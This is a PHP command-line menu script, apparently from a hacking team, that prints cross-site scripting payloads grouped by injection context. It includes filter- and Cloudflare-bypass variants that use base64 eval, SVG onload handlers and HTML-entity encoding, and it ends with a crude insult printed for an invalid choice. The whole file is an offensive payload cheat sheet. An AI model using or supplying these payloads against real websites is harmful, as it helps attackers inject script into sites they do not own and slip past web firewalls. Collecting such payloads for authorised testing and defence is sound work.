<?php 

echo "###################################################\n";
echo "#               Coded By : Micin                  #\n";
echo "#               WA:  081260341378                 #\n";
echo "#               Manusia Biasa Team                #\n";
echo "###################################################\n";
echo "1. Basic Payload XSS\n";
echo "2. Double Quote Payload\n";
echo "3. Singel Quote Payload\n";
echo "4. Without Quotations Payload\n";
echo "5. Bypass Firewall Payload\n";
echo "6. Bypass Cloudflare by Bohdan Korzhynskyi\n";
echo "7. Bypass Cloudflare by RakeshMane10\n";
echo "Pilih = ";
$pil = trim(fgets(STDIN));
if ($pil == '1') {
	sleep(2);
	print("1. <script>alert('123')</script>\n");
	print("2. <img src=`javascript:alert`(XSS);`>\n");
	print("3. <script>alert('XSS');</script>\n");
	print("4. javascript:alert('XSS')\n");
	echo "Thanks\n";
	exit();
} if ($pil == '2') {
	sleep(2);
	print("1. `autofocus onfocus=alert(1)`\n");
	print("2. `autofocus onblur=alert(1)` (Interaction)\n");
	print("3. `onmouseover=alert(1)//` (Interaction)\n");
	echo "Thanks\n";
	exit();
} if ($pil == '3') {
	sleep(2);
	echo "Note : Payloadnya sama";
	print("1. `autofocus onfocus=alert(1)`\n");
	print("2. `autofocus onblur=alert(1)` (Interaction)\n");
	print("3. `onmouseover=alert(1)//` (Interaction)\n");
	echo "Thanks\n";
	exit();
} if ($pil == '4') {
	sleep(2);
	print("1. `aaaa autofocus onfocus=alert(1)//`\n");
	print("2. `aaaa onbeforescriptexecute=alert(1)//`\n");
	print("3. `aaaa onmouseover=alert(1)//`\n");
	echo "Thanks\n";
	exit();
} if ($pil == '5') {
	sleep(2);
	print("1. <img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />\n");
	print("2. <--`<img/src=`%20onerror=confirm``>%20--!>\n");
	echo "Thanks\n";
	exit();
} if ($pil == '6') {
	sleep(2);
	print("1. <svg onload=prompt%26%230000000040document.domain)>\n");
	print("2. <svg onload=prompt%26%23x000000028;document.domain)>\n");
	echo "Thanks\n";
	exit();
} if ($pil == '7') {
	sleep(2);
	print("1. <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f\n");
	echo "Thanks\n";
	exit();
} else {
	print("KU TONJOK BAPAK KAU MONYET\n");
	exit();
}

?>